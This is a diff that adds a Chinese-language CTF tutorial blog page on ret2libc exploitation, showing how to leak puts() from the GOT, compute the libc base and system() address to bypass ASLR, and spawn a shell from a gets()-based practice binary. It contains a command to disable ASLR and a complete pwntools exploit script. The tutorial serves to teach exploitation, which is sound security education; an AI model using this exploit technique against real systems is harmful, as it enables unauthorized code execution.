@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>ret2libc攻击技术示例-泄露libc基地址计算system()地址绕过ASLR</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>ret2libc攻击技术示例-泄露libc基地址计算system()地址绕过ASLR</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-03">2017-08-03</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#rop" title="rop">rop</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<h2 id="情景描述">情景描述</h2>
+
+<p>随着保护的加强，比如加入了<code class="highlighter-rouge">ASLR(Address Space Layout Randomization),地址空间格局的随机化</code>保护，这时我们所获取的各个函数地址都在变化中变得不再可用（在本地我们可用），这时我们还要使用libc中的system()函数获取shell的话，那我们该怎么办呢？</p>
+
+<p>其实<code class="highlighter-rouge">ASLR</code>在随机化过程中，只会改变libc的基地址，对于libc中各个函数的偏移是不会改变的，因此只要我们泄露内存中的<code class="highlighter-rouge">libc基地址</code>那么我们就能够根据偏移得到system()函数地址。</p>
+
+<p>当然我们本地是可以关闭<code class="highlighter-rouge">ASLR</code>保护的，只需要在终端执行以下命令</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-s</span>
+<span class="nb">echo </span>0 <span class="o">&gt;</span> /proc/sys/kernel/randomize_va_space <span class="c"># 2 - trun on</span>
+<span class="nb">exit</span>
+</code></pre></div></div>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>本节示例的漏洞代码可以在此处下载： <a href="http://od7mpc53s.bkt.clouddn.com/ret2libc3">ret2libc3</a> &amp; <a href="http://od7mpc53s.bkt.clouddn.com/libc.so.6">libc.so.6</a>
+当然这里的libc.so.6最好是用自己系统的。我们可以通过<code class="highlighter-rouge">ldd</code>命令查看</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ret2libc3 ldd ret2libc3
+	linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xf77da000<span class="o">)</span>
+	libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xf7605000<span class="o">)</span>
+	/lib/ld-linux.so.2 <span class="o">(</span>0x565eb000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>我们可以通过<code class="highlighter-rouge">sudo /lib/i386-linux-gnu/libc.so.6 .</code>获取合适的libc。否则的话，在本节中会出现无法拿到shell的情况哦。</p>
+
+<p>我们用IDA反编译一下可以看到</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-64h]@1
+</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"No surprise anymore, system disappeard QQ."</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Can you find it !?"</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>我们要怎么获得libc中某函数的地址呢？我们一般采用的方法就是泄露got表。因为linux的延迟绑定，我们需要选择至少执行过一次的函数进行泄露，比如这里的<code class="highlighter-rouge">puts()</code></p>
+
+<p>通过泄露<code class="highlighter-rouge">puts()</code>在libc中的偏移，再结合<code class="highlighter-rouge">puts()</code>的实际内存地址，我们可以这样进行计算：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">system_addr</span> <span class="o">-</span> <span class="n">libc_system</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc_puts</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc_system</span> <span class="o">-</span> <span class="n">libc_puts</span><span class="p">)</span>
+</code></pre></div></div>
+<p>即system()的内存地址为puts()的内存地址再加上两个函数在libc中的偏移差</p>
+
+<p>那么</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ret2libc3 objdump <span class="nt">-dj</span> .plt ret2libc3 | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"puts|system"</span>
+08048460 &lt;puts@plt&gt;:
+</code></pre></div></div>
+
+<h2 id="攻击代码">攻击代码</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c">#context.log_level = 'debug'</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'ret2libc3'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'libc.so.6'</span><span class="p">)</span>
+
+
+<span class="n">plt_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">got_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">plt_main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_start'</span><span class="p">]</span>
+
+<span class="n">libc_system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">libc_puts</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">112</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">got_puts</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'ret2libc3'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Can you find it !?'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">temp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">"[+] puts() address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc_puts</span>
+<span class="k">print</span> <span class="s">"[+] libc base address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_system</span>
+<span class="k">print</span> <span class="s">"[+] system address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+<span class="k">print</span> <span class="s">"[+] /bin/sh address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">112</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Can you find it !?'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8Csystem%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/03/ret2shellcode%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8Csystem%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/03/ret2shellcode%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
